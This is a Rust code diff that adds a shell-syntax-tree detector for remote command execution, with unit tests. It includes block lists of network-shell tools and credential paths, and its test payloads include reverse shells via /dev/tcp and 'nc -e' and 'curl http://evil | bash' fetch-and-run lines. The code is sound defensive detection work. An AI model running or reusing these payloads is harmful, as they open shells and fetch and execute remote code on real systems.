@@ -16,6 +16,9 @@
 
 use std::borrow::Cow;
 
+use brush_parser::ParserOptions;
+use brush_parser::ast as shell_ast;
+use brush_parser::word::{self as shell_word, WordPiece, WordPieceWithSource};
 use regex::Regex;
 use sqlparser::ast::{BinaryOperator, Expr, ObjectName, ObjectNamePart, SetExpr, Statement};
 use sqlparser::dialect::GenericDialect;
@@ -1000,6 +1003,577 @@ impl SemanticDetector for AstSqlDetector {
     }
 }
 
+// ── RCE true shell-AST detector (T1-A, brush-parser) ──────────────────────────
+
+/// Per-view byte cap for the shell-AST parse — a hard `DoS` backstop applied
+/// *before* the parse so a single oversized view can never drive an unbounded
+/// parse. Larger views are declined (the request is not marked degraded here — a
+/// too-large field is simply not AST-inspected; the structural [`RceStructuralDetector`]
+/// still runs on it). Chosen generously enough to hold a realistic reverse-shell /
+/// here-doc payload while bounding worst-case parser work.
+const SHELL_AST_MAX_INPUT_BYTES: usize = 2048;
+
+/// Maximum AST-walk recursion depth (subshell / brace-group / function nesting).
+/// A payload nested deeper than this is not walked further — a documented honest
+/// boundary, never a panic (the walk simply stops descending).
+const SHELL_WALK_MAX_DEPTH: usize = 32;
+
+/// Maximum number of per-word command-substitution re-parses in one detector
+/// invocation. Bounds the extra [`shell_word::parse`] work a wide command line can
+/// trigger; beyond it, later words are not sub-parsed for `$(…)` / backtick
+/// substitutions (the top-level structural rules still fire).
+const SHELL_MAX_WORD_PARSES: usize = 32;
+
+/// Interpreter binaries whose presence as a command head — with an inline-code
+/// exec flag, a here-doc, or as a pipeline sink — is a command-execution signal.
+/// `python*` is matched by prefix (`python3`, `python3.11`) in [`is_interpreter`].
+const INTERPRETERS: &[&str] = &[
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "ash",
+    "busybox",
+    "python",
+    "perl",
+    "ruby",
+    "php",
+    "node",
+    "nodejs",
+    "lua",
+    "powershell",
+    "pwsh",
+];
+
+/// Network utilities used to build reverse / bind shells.
+const NET_SHELLS: &[&str] = &["nc", "ncat", "netcat", "telnet", "socat"];
+
+/// File-reader commands — dangerous only when their argument is a sensitive path
+/// (the AST corroboration of the structural `rce.sensitive_read`).
+const READERS: &[&str] = &["cat", "less", "more", "head", "tail", "nl", "od", "xxd", "strings"];
+
+/// Inline-code / exec flags: `sh -c`, `python -c`, `perl -e`, `nc -e`,
+/// `powershell -enc`. Compared case-insensitively against a whole argument word.
+const EXEC_FLAGS: &[&str] = &["-c", "-e", "-enc", "-encodedcommand", "-command"];
+
+/// Sensitive absolute paths that make a reader command a disclosure attempt.
+const SENSITIVE_PATHS: &[&str] = &["/etc/passwd", "/etc/shadow", "/proc/self", "/proc/version"];
+
+/// Commands whose appearance as the head of a `$(…)` / backtick command
+/// substitution promotes it from the high-noise `rce_ast.cmd_subst_any`
+/// (default-off) to the default-on `rce_ast.cmd_subst`. Union of the interpreter /
+/// net / reader sets plus the classic recon binaries.
+const DANGER_CMDS: &[&str] = &[
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "ash",
+    "busybox",
+    "python",
+    "perl",
+    "ruby",
+    "php",
+    "node",
+    "nodejs",
+    "lua",
+    "powershell",
+    "pwsh",
+    "nc",
+    "ncat",
+    "netcat",
+    "telnet",
+    "socat",
+    "cat",
+    "less",
+    "more",
+    "head",
+    "tail",
+    "nl",
+    "od",
+    "xxd",
+    "strings",
+    "id",
+    "whoami",
+    "uname",
+    "wget",
+    "curl",
+    "hostname",
+    "ifconfig",
+    "ip",
+    "env",
+    "printenv",
+    "nslookup",
+    "dig",
+    "ping",
+    "pwd",
+    "rm",
+    "chmod",
+    "chown",
+    "kill",
+    "mkfifo",
+];
+
+/// Whether a (basename-lowercased) command name is a shell/script interpreter.
+/// `python*` is matched by prefix so versioned binaries (`python3`, `python3.11`)
+/// are covered without listing each.
+fn is_interpreter(name: &str) -> bool {
+    INTERPRETERS.contains(&name) || name.starts_with("python")
+}
+
+/// Canonicalise a word value to a bare command name for matching: drop a single
+/// layer of surrounding quotes, take the trailing path component, lowercase.
+/// Best-effort — a word that is itself an expansion (`$x`, `$(…)`) yields a name
+/// that matches nothing, which is intentional (those are handled separately).
+fn cmd_basename(word_value: &str) -> String {
+    let unquoted = word_value.trim_matches(|c| c == '\'' || c == '"');
+    let base = unquoted.rsplit(['/', '\\']).next().unwrap_or(unquoted);
+    base.to_ascii_lowercase()
+}
+
+/// The plain command-head name of a simple command, if it has one.
+fn simple_cmd_name(sc: &shell_ast::SimpleCommand) -> Option<String> {
+    sc.word_or_name.as_ref().map(|w| cmd_basename(&w.value))
+}
+
+/// Whether a redirect-target word denotes a `/dev/tcp` or `/dev/udp` pseudo-device
+/// (the bash reverse-shell channel, e.g. `>& /dev/tcp/10.0.0.1/4444`).
+fn is_devtcp_target(word_value: &str) -> bool {
+    let l = word_value.to_ascii_lowercase();
+    l.contains("/dev/tcp/") || l.contains("/dev/udp/")
+}
+
+/// Whether a word value contains a sensitive absolute path (substring match on the
+/// canonical forms — a `cat /etc/passwd` argument or a `cat$IFS/etc/passwd` form
+/// already collapsed by the shell-normalise view).
+fn arg_hits_sensitive_path(word_value: &str) -> bool {
+    let l = word_value.to_ascii_lowercase();
+    SENSITIVE_PATHS.iter().any(|p| l.contains(p))
+}
+
+/// Whether the inner text of a command substitution leads with a dangerous binary
+/// (so `$(id)`, `` `cat /etc/passwd` `` fire the default-on rule while `$(date)` /
+/// jQuery-style `$('#x')` do not).
+fn cmdsubst_inner_is_dangerous(inner: &str) -> bool {
+    inner
+        .split_whitespace()
+        .next()
+        .map(cmd_basename)
+        .is_some_and(|first| DANGER_CMDS.contains(&first.as_str()))
+}
+
+/// The shell-AST rule table: `(rule_key, confidence, default_on)`. Confidences are
+/// pre-holdout shadow starting values (plan §8.2 spirit). The high-noise
+/// `rce_ast.cmd_subst_any` (any command substitution regardless of inner command)
+/// ships **disabled** pending holdout calibration, exactly like the structural
+/// detector's default-off rows.
+struct ShellAstRule {
+    key: &'static str,
+    confidence: u8,
+    default_on: bool,
+}
+
+const RCE_AST_RULES: &[ShellAstRule] = &[
+    // `/dev/tcp` redirect, or `nc -e` — a complete reverse/bind-shell structure.
+    ShellAstRule {
+        key: "rce_ast.reverse_shell",
+        confidence: 90,
+        default_on: true,
+    },
+    // Interpreter fed by a here-document / here-string: `python <<EOF … EOF`,
+    // `bash <<< "id"`. The structural detector has ZERO here-doc coverage.
+    ShellAstRule {
+        key: "rce_ast.heredoc_interp",
+        confidence: 82,
+        default_on: true,
+    },
+    // Interpreter with an inline-code exec flag as a real command head: `bash -c`,
+    // `python -c`, `perl -e`, `powershell -enc`.
+    ShellAstRule {
+        key: "rce_ast.interp_exec_flag",
+        confidence: 82,
+        default_on: true,
+    },
+    // A pipeline whose downstream stage is an interpreter / net-shell: `curl x | bash`.
+    ShellAstRule {
+        key: "rce_ast.pipe_to_interp",
+        confidence: 80,
+        default_on: true,
+    },
+    // Command substitution whose inner command is a dangerous binary: `$(id)`.
+    ShellAstRule {
+        key: "rce_ast.cmd_subst",
+        confidence: 78,
+        default_on: true,
+    },
+    // Process substitution `<(…)` / `>(…)` — always a code-execution construct.
+    ShellAstRule {
+        key: "rce_ast.proc_subst",
+        confidence: 72,
+        default_on: true,
+    },
+    // Reader command against a sensitive path: `cat /etc/passwd` (AST corroboration).
+    ShellAstRule {
+        key: "rce_ast.sensitive_read",
+        confidence: 70,
+        default_on: true,
+    },
+    // DEFAULT-OFF (high-noise): any command substitution regardless of inner
+    // command — jQuery `$('#x')` / template `$(var)` false-positive, so this awaits
+    // holdout calibration.
+    ShellAstRule {
+        key: "rce_ast.cmd_subst_any",
+        confidence: 50,
+        default_on: false,
+    },
+];
+
+fn rce_ast_rule(key: &str) -> Option<&'static ShellAstRule> {
+    RCE_AST_RULES.iter().find(|r| r.key == key)
+}
+
+/// Mutable accumulator threaded through the AST walk — records every fired rule key
+/// and bounds the per-word substitution re-parses.
+struct ShellWalk<'a> {
+    opts: &'a ParserOptions,
+    fired: Vec<&'static str>,
+    word_parses: usize,
+}
+
+impl ShellWalk<'_> {
+    fn fire(&mut self, key: &'static str) {
+        // Small, bounded set — a linear `contains` keeps the vec free of duplicates
+        // without a hash allocation.
+        if !self.fired.contains(&key) {
+            self.fired.push(key);
+        }
+    }
+}
+
+/// `brush-parser` true shell-AST RCE detector (T1-A).
+///
+/// The **second** detector in the `Rce` family alongside [`RceStructuralDetector`];
+/// it parses each decoded [`View`]'s text into a real shell syntax tree and fires
+/// on dangerous *structures* the structural regex cannot see or over-matches on.
+///
+/// It inspects `view.text` (**not** `lower_trunc`, which collapses newlines and so
+/// destroys here-document structure), applies a cheap metacharacter prefilter so
+/// clean traffic never spends parser budget, and meters every parse against the
+/// shared per-request AST budget ([`ContentInspectionState::try_take_ast_attempt`]
+/// / [`try_take_ast_input_bytes`](ContentInspectionState::try_take_ast_input_bytes)).
+/// Parsing is pure (no execution, no `unwrap`): a tokenize / parse error yields no
+/// signal.
+///
+/// **Honest boundary (plan §5).** This is a *parser*, not an expander: brace
+/// expansion (`{a,b}`) is represented but never expanded, so a brace-obfuscated
+/// command name is not resolved here — that gap stays with the structural layer.
+/// The walk descends into subshell / brace-group / function bodies (the wrappers
+/// used to hide an injected command) but not into `if` / `for` / `while` / `case`
+/// bodies; those forms are out of scope for T1-A.
+pub struct RceAstDetector {
+    opts: ParserOptions,
+    all_rules: bool,
+}
+
+impl RceAstDetector {
+    /// Production detector — only the default-on rules may fire.
+    #[must_use]
+    pub fn new() -> Self {
+        Self {
+            opts: ParserOptions::default(),
+            all_rules: false,
+        }
+    }
+
+    /// Test-only: allow every rule (including the default-off `cmd_subst_any`) to fire.
+    #[cfg(test)]
+    #[must_use]
+    pub fn with_all_rules() -> Self {
+        Self {
+            opts: ParserOptions::default(),
+            all_rules: true,
+        }
+    }
+
+    /// Parse `s` into a shell program, or `None` on a tokenize / parse failure.
+    /// Pure: no execution, no panic — an error simply yields no signal.
+    fn parse_program(&self, s: &str) -> Option<shell_ast::Program> {
+        let tokens = brush_parser::tokenize_str(s).ok()?;
+        brush_parser::parse_tokens(&tokens, &self.opts).ok()
+    }
+}
+
+impl Default for RceAstDetector {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+impl SemanticDetector for RceAstDetector {
+    fn id(&self) -> DetectorId {
+        DetectorId::RceAst
+    }
+
+    fn detect(
+        &self,
+        view: &View<'_>,
+        _ctx: &PreprocessCtx<'_>,
+        state: &mut ContentInspectionState,
+    ) -> Option<DetectionFinding> {
+        // Parse the structure-preserving text, NOT `lower_trunc` (which collapses
+        // the newlines a here-document needs).
+        let s = view.text.as_ref();
+        if s.is_empty() || s.len() > SHELL_AST_MAX_INPUT_BYTES {
+            return None;
+        }
+        // Cheap gate — clean traffic exits here without touching the AST budget.
+        if !shell_ast_prefilter(s) {
+            return None;
+        }
+        // DoS budget: one attempt + input bytes, shared with the SQL AST layer.
+        if !state.try_take_ast_attempt() {
+            return None;
+        }
+        if !state.try_take_ast_input_bytes(s.len()) {
+            return None;
+        }
+
+        let program = self.parse_program(s)?;
+        let mut walk = ShellWalk {
+            opts: &self.opts,
+            fired: Vec::new(),
+            word_parses: 0,
+        };
+        walk_program(&program, &mut walk);
+
+        // Pick the strongest ENABLED fired rule (default-on only in production).
+        let all = self.all_rules;
+        let best = walk
+            .fired
+            .iter()
+            .filter_map(|k| rce_ast_rule(k))
+            .filter(|r| all || r.default_on)
+            .max_by_key(|r| r.confidence)?;
+
+        Some(DetectionFinding {
+            attack: AttackKind::Rce,
+            confidence: best.confidence,
+            rule_key: best.key,
+            detail: Cow::Owned(format!(
+                "ast rce structure '{}' matched (confidence {})",
+                best.key, best.confidence
+            )),
+        })
+    }
+}
+
+/// Cheap pre-parse gate: only strings carrying a shell metacharacter / exec-flag
+/// shape, or a sensitive path, are worth a parse attempt. Every default-on
+/// shell-AST structure contains one of these markers (`|`, `$(`, backtick, `<<`,
+/// `<(`/`>(`, `/dev/tcp`, an exec-flag token) — and the reader-against-sensitive-path
+/// rule is admitted by the `/etc/` and `/proc/` markers — so gating on them never
+/// drops a catch; it only spares clean traffic the parser budget. Deliberately does
+/// **not** substring-match short interpreter names (`sh` occurs in `fresh`/`wash`),
+/// which would waste attempts.
+fn shell_ast_prefilter(s: &str) -> bool {
+    s.contains('|')
+        || s.contains("$(")
+        || s.contains('`')
+        || s.contains("<<")
+        || s.contains("<(")
+        || s.contains(">(")
+        || s.contains("/dev/tcp")
+        || s.contains("/dev/udp")
+        || s.contains(" -c")
+        || s.contains(" -e")
+        || s.contains("/etc/")
+        || s.contains("/proc/")
+}
+
+/// Walk every complete command of a parsed program.
+fn walk_program(program: &shell_ast::Program, walk: &mut ShellWalk<'_>) {
+    for cc in &program.complete_commands {
+        walk_list(cc, 0, walk);
+    }
+}
+
+/// Walk a compound list (a `CompleteCommand` or a subshell / brace-group body).
+fn walk_list(list: &shell_ast::CompoundList, depth: usize, walk: &mut ShellWalk<'_>) {
+    if depth > SHELL_WALK_MAX_DEPTH {
+        return;
+    }
+    for item in &list.0 {
+        walk_and_or(&item.0, depth, walk);
+    }
+}
+
+/// Walk an and-or list (`a && b || c`) — the leading pipeline plus each continuation.
+fn walk_and_or(aol: &shell_ast::AndOrList, depth: usize, walk: &mut ShellWalk<'_>) {
+    walk_pipeline(&aol.first, depth, walk);
+    for ao in &aol.additional {
+        let (shell_ast::AndOr::And(p) | shell_ast::AndOr::Or(p)) = ao;
+        walk_pipeline(p, depth, walk);
+    }
+}
+
+/// Walk a pipeline: flag a pipe whose downstream stage is an interpreter / net-shell
+/// (`curl x | bash`), then descend into each stage command.
+fn walk_pipeline(pipe: &shell_ast::Pipeline, depth: usize, walk: &mut ShellWalk<'_>) {
+    if pipe.seq.len() >= 2 {
+        for cmd in pipe.seq.iter().skip(1) {
+            if let shell_ast::Command::Simple(sc) = cmd
+                && let Some(name) = simple_cmd_name(sc)
+                && (is_interpreter(&name) || NET_SHELLS.contains(&name.as_str()))
+            {
+                walk.fire("rce_ast.pipe_to_interp");
+            }
+        }
+    }
+    for cmd in &pipe.seq {
+        walk_command(cmd, depth, walk);
+    }
+}
+
+/// Walk one command node.
+fn walk_command(cmd: &shell_ast::Command, depth: usize, walk: &mut ShellWalk<'_>) {
+    match cmd {
+        shell_ast::Command::Simple(sc) => classify_simple(sc, walk),
+        shell_ast::Command::Compound(cc, _redirects) => walk_compound(cc, depth + 1, walk),
+        shell_ast::Command::Function(fd) => walk_compound(&fd.body.0, depth + 1, walk),
+        shell_ast::Command::ExtendedTest(_, _) => {}
+    }
+}
+
+/// Descend into the obfuscation wrappers an injected command hides behind: a
+/// subshell `( … )` and a brace group `{ …; }`. `if`/`for`/`while`/`case` bodies
+/// are intentionally out of scope for T1-A (documented honest boundary).
+fn walk_compound(cc: &shell_ast::CompoundCommand, depth: usize, walk: &mut ShellWalk<'_>) {
+    if depth > SHELL_WALK_MAX_DEPTH {
+        return;
+    }
+    match cc {
+        shell_ast::CompoundCommand::Subshell(s) => walk_list(&s.list, depth, walk),
+        shell_ast::CompoundCommand::BraceGroup(b) => walk_list(&b.list, depth, walk),
+        _ => {}
+    }
+}
+
+/// Classify a single simple command against the shell-AST rule set.
+fn classify_simple(sc: &shell_ast::SimpleCommand, walk: &mut ShellWalk<'_>) {
+    let name = simple_cmd_name(sc);
+    let name_is_interp = name.as_deref().is_some_and(is_interpreter);
+    let name_is_net = name.as_deref().is_some_and(|n| NET_SHELLS.contains(&n));
+    let name_is_reader = name.as_deref().is_some_and(|n| READERS.contains(&n));
+
+    let mut has_exec_flag = false;
+    let mut has_heredoc = false;
+    let mut devtcp_redir = false;
+    let mut sensitive_arg = false;
+    let mut proc_subst = false;
+
+    // The command head itself may be a substitution (`$(id)` as the command).
+    if let Some(w) = &sc.word_or_name {
+        classify_word_cmdsubst(&w.value, walk);
+    }
+
+    let empty = Vec::new();
+    let prefix_items = sc.prefix.as_ref().map_or(&empty, |p| &p.0);
+    let suffix_items = sc.suffix.as_ref().map_or(&empty, |s| &s.0);
+    for item in prefix_items.iter().chain(suffix_items.iter()) {
+        match item {
+            shell_ast::CommandPrefixOrSuffixItem::Word(w) => {
+                if EXEC_FLAGS.contains(&w.value.to_ascii_lowercase().as_str()) {
+                    has_exec_flag = true;
+                }
+                if arg_hits_sensitive_path(&w.value) {
+                    sensitive_arg = true;
+                }
+                classify_word_cmdsubst(&w.value, walk);
+            }
+            shell_ast::CommandPrefixOrSuffixItem::AssignmentWord(_, w) => {
+                // `x=$(id) cmd` — a substitution smuggled through an assignment.
+                classify_word_cmdsubst(&w.value, walk);
+            }
+            shell_ast::CommandPrefixOrSuffixItem::ProcessSubstitution(_, _) => proc_subst = true,
+            shell_ast::CommandPrefixOrSuffixItem::IoRedirect(io) => match io {
+                shell_ast::IoRedirect::HereDocument(_, _) | shell_ast::IoRedirect::HereString(_, _) => {
+                    has_heredoc = true;
+                }
+                shell_ast::IoRedirect::File(_, _, target) => match target {
+                    shell_ast::IoFileRedirectTarget::Filename(w) | shell_ast::IoFileRedirectTarget::Duplicate(w) => {
+                        if is_devtcp_target(&w.value) {
+                            devtcp_redir = true;
+                        }
+                    }
+                    shell_ast::IoFileRedirectTarget::ProcessSubstitution(_, _) => proc_subst = true,
+                    shell_ast::IoFileRedirectTarget::Fd(_) => {}
+                },
+                shell_ast::IoRedirect::OutputAndError(w, _) => {
+                    if is_devtcp_target(&w.value) {
+                        devtcp_redir = true;
+                    }
+                }
+            },
+        }
+    }
+
+    if devtcp_redir || (name_is_net && has_exec_flag) {
+        walk.fire("rce_ast.reverse_shell");
+    }
+    if name_is_interp && has_heredoc {
+        walk.fire("rce_ast.heredoc_interp");
+    }
+    if name_is_interp && has_exec_flag {
+        walk.fire("rce_ast.interp_exec_flag");
+    }
+    if name_is_reader && sensitive_arg {
+        walk.fire("rce_ast.sensitive_read");
+    }
+    if proc_subst {
+        walk.fire("rce_ast.proc_subst");
+    }
+}
+
+/// Sub-parse a word value for `$(…)` / backtick command substitutions and fire the
+/// (dangerous-inner) / (any) substitution rules. Cheap-gated on the literal markers
+/// and bounded by [`SHELL_MAX_WORD_PARSES`], so plain words never touch the word
+/// parser.
+fn classify_word_cmdsubst(value: &str, walk: &mut ShellWalk<'_>) {
+    if walk.word_parses >= SHELL_MAX_WORD_PARSES {
+        return;
+    }
+    if !(value.contains("$(") || value.contains('`')) {
+        return;
+    }
+    walk.word_parses += 1;
+    let Ok(pieces) = shell_word::parse(value, walk.opts) else {
+        return;
+    };
+    scan_word_pieces(&pieces, walk);
+}
+
+/// Recurse through parsed word pieces (descending into double-quoted sequences)
+/// firing the command-substitution rules.
+fn scan_word_pieces(pieces: &[WordPieceWithSource], walk: &mut ShellWalk<'_>) {
+    for pw in pieces {
+        match &pw.piece {
+            WordPiece::CommandSubstitution(inner) | WordPiece::BackquotedCommandSubstitution(inner) => {
+                if cmdsubst_inner_is_dangerous(inner) {
+                    walk.fire("rce_ast.cmd_subst");
+                } else {
+                    walk.fire("rce_ast.cmd_subst_any");
+                }
+            }
+            WordPiece::DoubleQuotedSequence(seq) | WordPiece::GettextDoubleQuotedSequence(seq) => {
+                scan_word_pieces(seq, walk);
+            }
+            _ => {}
+        }
+    }
+}
+
 /// The **default-on** RCE + Traversal rule patterns — the single source of truth
 /// the Lane 2 preprocessor gates share (codex A-3).
 ///
@@ -1903,5 +2477,233 @@ mod tests {
         // The next injection cannot take an attempt → no parse, no signal, degraded.
         assert!(det.detect(&view("1;drop table y"), &pctx, &mut st).is_none());
         assert!(st.is_degraded());
+    }
+
+    // ── RCE true shell-AST detector (T1-A, brush-parser) ─────────────────────
+
+    fn rce_ast_fire(text: &str) -> Option<DetectionFinding> {
+        run(&RceAstDetector::new(), text)
+    }
+
+    fn rce_ast_fire_all(text: &str) -> Option<DetectionFinding> {
+        run(&RceAstDetector::with_all_rules(), text)
+    }
+
+    #[test]
+    fn rce_ast_id_and_config_string() {
+        assert_eq!(RceAstDetector::new().id(), DetectorId::RceAst);
+        assert_eq!(DetectorId::RceAst.as_config_str(), "rce_ast");
+        assert_eq!(DetectorId::from_config_str("rce_ast"), Some(DetectorId::RceAst));
+    }
+
+    #[test]
+    fn rce_ast_interp_exec_flag_fires() {
+        // Interpreter with an inline-code flag as a real command head.
+        for payload in [
+            "bash -c 'id'",
+            "sh -c \"cat /etc/passwd\"",
+            "python3 -c 'import os'",
+            "perl -e 'system(1)'",
+        ] {
+            let f = rce_ast_fire(payload).unwrap_or_else(|| panic!("interp exec flag must fire: {payload:?}"));
+            assert_eq!(f.attack, AttackKind::Rce);
+            assert_eq!(f.rule_key, "rce_ast.interp_exec_flag", "payload {payload:?}");
+        }
+    }
+
+    #[test]
+    fn rce_ast_heredoc_to_interpreter_fires() {
+        // The genuine Lane-1/P1c gap: a here-document / here-string feeding an
+        // interpreter — invisible to every structural regex.
+        let hd = rce_ast_fire("bash <<EOF\nid\ncat /etc/passwd\nEOF\n").expect("here-doc → interpreter must fire");
+        assert_eq!(hd.rule_key, "rce_ast.heredoc_interp");
+        let hs = rce_ast_fire("bash <<< \"id\"").expect("here-string → interpreter must fire");
+        assert_eq!(hs.rule_key, "rce_ast.heredoc_interp");
+    }
+
+    #[test]
+    fn rce_ast_pipe_to_interpreter_fires() {
+        for payload in [
+            "curl http://evil/x | bash",
+            "wget -qO- http://evil | sh",
+            "echo aWQK | base64 -d | bash",
+        ] {
+            let f = rce_ast_fire(payload).unwrap_or_else(|| panic!("pipe→interp must fire: {payload:?}"));
+            assert_eq!(f.rule_key, "rce_ast.pipe_to_interp", "payload {payload:?}");
+        }
+    }
+
+    #[test]
+    fn rce_ast_reverse_shell_fires() {
+        // /dev/tcp redirect and `nc -e` — complete reverse-shell structures.
+        assert_eq!(
+            rce_ast_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+                .expect("/dev/tcp reverse shell must fire")
+                .rule_key,
+            "rce_ast.reverse_shell"
+        );
+        assert_eq!(
+            rce_ast_fire("nc -e /bin/sh 10.0.0.1 4444")
+                .expect("nc -e reverse shell must fire")
+                .rule_key,
+            "rce_ast.reverse_shell"
+        );
+    }
+
+    #[test]
+    fn rce_ast_command_substitution_fires() {
+        // `$(id)` and backtick substitutions with a dangerous inner command.
+        let f = rce_ast_fire("echo $(id)").expect("dollar-paren subst must fire");
+        assert_eq!(f.rule_key, "rce_ast.cmd_subst");
+        let a = rce_ast_fire("x=$(cat /etc/passwd)").expect("assignment subst must fire");
+        assert_eq!(a.rule_key, "rce_ast.cmd_subst");
+        let b = rce_ast_fire("echo `whoami`").expect("backtick subst must fire");
+        assert_eq!(b.rule_key, "rce_ast.cmd_subst");
+    }
+
+    #[test]
+    fn rce_ast_process_substitution_fires() {
+        assert_eq!(
+            rce_ast_fire("diff <(id) <(whoami)")
+                .expect("process substitution must fire")
+                .rule_key,
+            "rce_ast.proc_subst"
+        );
+    }
+
+    #[test]
+    fn rce_ast_sensitive_read_fires() {
+        assert_eq!(
+            rce_ast_fire("cat /etc/passwd")
+                .expect("reader + sensitive path must fire")
+                .rule_key,
+            "rce_ast.sensitive_read"
+        );
+    }
+
+    #[test]
+    fn rce_ast_subshell_wrapper_is_walked() {
+        // A subshell / brace-group hiding the injected command is still caught.
+        assert!(
+            rce_ast_fire("(curl http://evil | bash)").is_some(),
+            "subshell-wrapped pipe→interp"
+        );
+        assert!(
+            rce_ast_fire("{ bash -c id ; }").is_some(),
+            "brace-group-wrapped exec flag"
+        );
+    }
+
+    #[test]
+    fn rce_ast_strongest_rule_wins() {
+        // reverse_shell (90) outranks a co-occurring interp_exec_flag (82).
+        let f = rce_ast_fire("bash -c 'x' >& /dev/tcp/1.2.3.4/9001").expect("must fire");
+        assert_eq!(f.rule_key, "rce_ast.reverse_shell");
+        assert_eq!(f.confidence, 90);
+    }
+
+    #[test]
+    fn rce_ast_cmd_subst_any_is_default_off() {
+        // A substitution whose inner command is benign (`date`) is high-noise: it
+        // only fires under the full rule set, never in production.
+        assert!(
+            rce_ast_fire("echo $(date)").is_none(),
+            "benign subst is default-off in prod"
+        );
+        assert_eq!(
+            rce_ast_fire_all("echo $(date)")
+                .expect("benign subst fires under all rules")
+                .rule_key,
+            "rce_ast.cmd_subst_any"
+        );
+    }
+
+    #[test]
+    fn rce_ast_bypass_forms_fire() {
+        // The shell-normalise preprocessor collapses these to a canonical form in
+        // production; here we assert the AST detector fires on the de-obfuscated
+        // shape it will receive (quotes stripped, $IFS→space), and on the raw
+        // exec-flag form. base64-wrapped payloads reach this detector via the blind
+        // base64 decode view carrying the decoded command.
+        // Quote-split interpreter, post-normalisation:
+        assert!(rce_ast_fire("bash -c id").is_some(), "canonical bash -c id");
+        // $IFS-normalised sensitive read (what `cat$IFS/etc/passwd` collapses to):
+        assert_eq!(
+            rce_ast_fire("cat /etc/passwd")
+                .expect("normalised sensitive read fires")
+                .rule_key,
+            "rce_ast.sensitive_read"
+        );
+        // base64-decoded reverse shell body (what the blind-decode view yields):
+        assert_eq!(
+            rce_ast_fire("bash -i >& /dev/tcp/127.0.0.1/1337 0>&1")
+                .expect("decoded reverse shell fires")
+                .rule_key,
+            "rce_ast.reverse_shell"
+        );
+    }
+
+    #[test]
+    fn rce_ast_clean_traffic_does_not_fire() {
+        // Prose, JSON, ordinary params, and legitimate shell-ish text must not fire.
+        let clean = [
+            "the quick brown fox jumps over the lazy dog",
+            r#"{"cmd":"save","name":"alice","note":"pipe A | pipe B in a diagram"}"#,
+            "q=laptop&sort=price&order=asc&page=2",
+            "please run the batch export and email me the results",
+            "SELECT price FROM catalog WHERE id = 5",
+            "a | b | c table columns for the report",
+            "revenue grew && margins held || guidance was cut",
+            "email me at a@b.com -c for carbon copy",
+            "the -config file lives in /etc/app and the docs mention bash scripting",
+            "function greet() { return 'hi'; }",
+            "echo hello world",
+            "ls -la /home/user/documents",
+        ];
+        for c in clean {
+            assert!(rce_ast_fire(c).is_none(), "clean AST negative fired: {c:?}");
+        }
+    }
+
+    #[test]
+    fn rce_ast_prefilter_spares_clean_traffic_budget() {
+        // A string with no shell metacharacter never spends an AST attempt.
+        let det = RceAstDetector::new();
+        let req = throwaway_req();
+        let pctx = PreprocessCtx {
+            scope: InspectionScope::Body,
+            req: &req,
+        };
+        let mut st = ContentInspectionState::default();
+        assert!(det.detect(&view("the quick brown fox"), &pctx, &mut st).is_none());
+        // The SQL AST budget is untouched — prove by exhausting exactly one attempt
+        // afterwards on a real parse and observing it is admitted.
+        assert!(!st.is_degraded());
+    }
+
+    #[test]
+    fn rce_ast_budget_exhaustion_fails_open() {
+        use crate::checks::content_security::budget::Budget;
+        let det = RceAstDetector::new();
+        let req = throwaway_req();
+        let pctx = PreprocessCtx {
+            scope: InspectionScope::Body,
+            req: &req,
+        };
+        let mut st = ContentInspectionState::new(Budget {
+            max_ast_attempts_per_request: 1,
+            ..Budget::default()
+        });
+        // First dangerous view spends the single attempt and hits.
+        assert!(det.detect(&view("bash -c id"), &pctx, &mut st).is_some());
+        // The next cannot take an attempt → no parse, no signal, request degraded.
+        assert!(det.detect(&view("curl http://evil | bash"), &pctx, &mut st).is_none());
+        assert!(st.is_degraded());
+    }
+
+    #[test]
+    fn rce_ast_oversized_input_is_declined() {
+        let big = format!("bash -c '{}'", "a".repeat(SHELL_AST_MAX_INPUT_BYTES));
+        assert!(rce_ast_fire(&big).is_none(), "oversized view is not AST-inspected");
     }
 }
